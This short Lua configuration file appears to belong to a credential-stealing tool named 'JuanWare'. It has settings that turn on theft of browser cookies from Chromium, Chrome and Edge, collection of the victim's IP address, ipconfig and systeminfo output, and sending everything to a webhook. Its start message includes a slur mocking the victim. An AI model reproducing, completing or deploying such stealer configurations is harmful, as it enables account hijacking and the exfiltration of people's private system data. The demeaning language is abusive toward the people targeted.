return {
    Webhook = "",
    -- Sends https requests to dump all of the info it can find

    Stealer = {
        Enabled = true,

        Cookies = true,

        Browsers = {
            "Chromium",
            "Chrome",
            "Edge"
        }
    },

    Leaker = {
        Enabled = true,

        IP = true,
        IPConfig = true,
        systeminfoCMD = true
    },

    Extras = {
        StartMSG = "A dumb retard has started JuanWare!", -- Leave empty for nothing
        EndMSG = "Hey @everyone, i guess thats it!", -- Leave empty for nothing

        MOTD = {
            Enabled = true,
            Messages = {}
        }
    }

}
